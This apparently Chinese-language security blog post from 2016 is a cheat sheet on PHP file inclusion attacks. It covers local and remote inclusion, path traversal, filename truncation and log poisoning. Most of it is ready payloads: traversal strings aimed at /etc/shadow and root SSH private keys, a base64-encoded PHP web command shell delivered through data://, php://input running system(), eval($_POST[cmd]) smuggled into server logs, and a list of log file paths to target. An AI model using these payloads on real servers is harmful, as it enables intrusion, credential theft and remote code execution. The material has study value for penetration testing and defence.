---
title: "php 文件包含"
date: 2016-02-24 16:47
---

## 与文件包含相关的函数

require找不到被包含的文件时会产生致命错误，并停止脚本运行。

include找不到被包含的文件时只会产生警告，脚本将继续运行。

include_once与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。

require_once与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含

## 本地文件包含(LFI--Local File Include)

* 普通本地包含

只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容

样例：

```
# lfi.php
<?php include($_GET['file']); ?>
```

利用

* 注入有效 php 代码

```
echo "<?php phpinfo();" >> lfi.txt

# browser
http://127.0.0.1/lfi.php?file=lfi.txt
```

* 目录遍历

```
# linux 这两个文件存储着所有文件的路径，需要root权限
?file=../../../../../../../var/lib/mlocate/mlocate.db
?file=../../../../../../../var/lib/locate.db
```

* 包含错误日志

```
?ile=../../../../../../../../var/log/apache/error.log
```

* 获取web目录或配置文件

```
?file=../../../../../../../../usr/local/apache2/conf/httpd.conf
```

* 包含上传附件

```
?file=../attachment/media/xx.file
```

* 读取 session 文件

```
?file=../../../../../../../tmp/sess_xxxxx
```

session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell

* 如果拥有root权限还可以试试读这些东西：

```
/root/.ssh/authorized_keys

/root/.ssh/id_rsa

/root/.ssh/id_rsa.keystore

/root/.ssh/id_rsa.pub

/root/.ssh/known_hosts

/etc/shadow

/root/.bash_history

/root/.mysql_history

/proc/self/fd/fd[0-9]* (文件标识符)

/proc/mounts

/proc/config.gz
```

## 截断本地包含

样例：

```
include($a.".php");
```

* 长文件名截断

php版本小于5.2.8(?)可以成功

windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了

样例：

```
<?php  include_once($_GET['f'].".php"); ?>  

# POC
http://127.0.0.1/test/123.php?f=test.txt/././....../

```
实例：

[长文件名截断: 济南大学主站本地文件包含导致代码执行][3]

1windows

windows在文件名后加/.  或 \.都是可以的

```
\.
./
/
\
```

2linux

```
./
/
```

* 点号截断：

?file=../../../../../../../../../boot.ini/......

(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

* %00 截断包含

> gpc=off 和 php 版本限制

## 远程包含

allow_url_include=On 就是远程文件包含，Off就是本地文件包含

> “zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)

* php 自带协议


** data:// **

Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur

> php>5.2 ,allow_url_include=On

```
# base64 decode is 'I love PHP\n'
echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');

# index.php
<? include($_GET['file'] . ".php");

# phpinfo
<? phpinfo(); die();?>

:::php
// Base64 Encoded
PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg==

// URL + Base64 Encoded
PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==

// Final URL
index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
```

gui command shell:

```
# GUI command shell.

# PHP Payload
<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>

# Base64 encoded payload

PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=

# Base64 + URL encoded payload
PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
```

** php://input ** -- php的输入流，可以读到没有处理过的POST数据

>  php5.0以下 和 php5.2 版本有效, allow_url_include=On


# firefox hackbar

```
?page=php://input

post:
<?php system('ls');?>
```

** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。

> php5.0以上

```
?url=php://filter/convert.base64-encode/resource=test.txt 

?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt
```

实战：

```
$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt
```

** php://fd **

> php 5.3.6中新增加

** glob **

> php>5.3.0

```
DirectoryIterator(“glob://ext/spl/examples/*.php”)
```

## 日记包含高级利用

[济南大学主站本地文件包含导致代码执行][3]

限制

> 类似http://www.exp.com/index<?php eval($_POST[cmd]);?>.php 
这样的提交，某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,如果PHP包含<?php%20eval($_POST[cmd]);?>这样的语句肯定是不会成功的，所以我们必须把空格真正的写入WEB日志.

突破

```
<?/**/eval($_POST[cmd]);/**/?>
```

1.short_open_tag=on
这类情况写入web日志，只能在short_open_tag=on的情况下才能有效，当short_open_tag=off时，PHP将不支持<?/**/eval($_POST[cmd]);/**/?>这样的短语句

2.WEB服务器一个奇怪的特性

如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.

这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。

利用NC伪造没有Connection HTTP标头的请求包：

```
GET /index< >.php HTTP/1.1
Accept: */*
Accept-Language: zh-cn
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Host: 192.168.3.44
```

你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！

* Popular log file paths targeted by LFI

```
1. /etc/httpd/logs/access.log
2. /etc/httpd/logs/access_log
3. /etc/httpd/logs/error.log
4. /etc/httpd/logs/error_log
5. /opt/lampp/logs/access_log
6. /usr/local/apache/log
7. /usr/local/apache/logs/access.log
8. /usr/local/apache/logs/error.log
9. /usr/local/etc/httpd/logs/access_log
10. /usr/local/www/logs/thttpd_log
11. /var/apache/logs/error_log
12. /var/log/apache/error.log
13. /var/log/apache-ssl/error.log
14. /var/log/httpd/error_log
15. /var/log/httpsd/ssl_log
16. /var/www/log/access_log
17. /var/www/logs/access.log
18. /var/www/logs/error.log
19. C:\apache\logs\access.log
20. C:\Program Files\Apache Group\Apache\logs\access.log
21. C:\program files\wamp\apache2\logs
22. C:\wamp\logs
23. C:\xampp\apache\logs\error.log
24. /opt/lampp/logs/error_log
25. /usr/local/apache/logs
26. /usr/local/apache/logs/access_log
27. /usr/local/apache/logs/error_log
28. /usr/local/etc/httpd/logs/error_log
29. /var/apache/logs/access_log
30. /var/log/apache/access.log
31. /var/log/apache-ssl/access.log
32. /var/log/httpd/access_log
33. /var/log/httpsd/ssl.access_log
34. /var/log/thttpd_log
35. /var/www/log/error_log
36. /var/www/logs/access_log
37. /var/www/logs/error_log
38. C:\apache\logs\error.log
39. C:\Program Files\Apache Group\Apache\logs\error.log
40. C:\wamp\apache2\logs
41. C:\xampp\apache\logs\access.log
42. proc/self/environ
```

[3]: http://www.wooyun.org/bugs/wooyun-2011-02236

[5]: http://php.net/manual/zh/features.file-upload.post-method.php
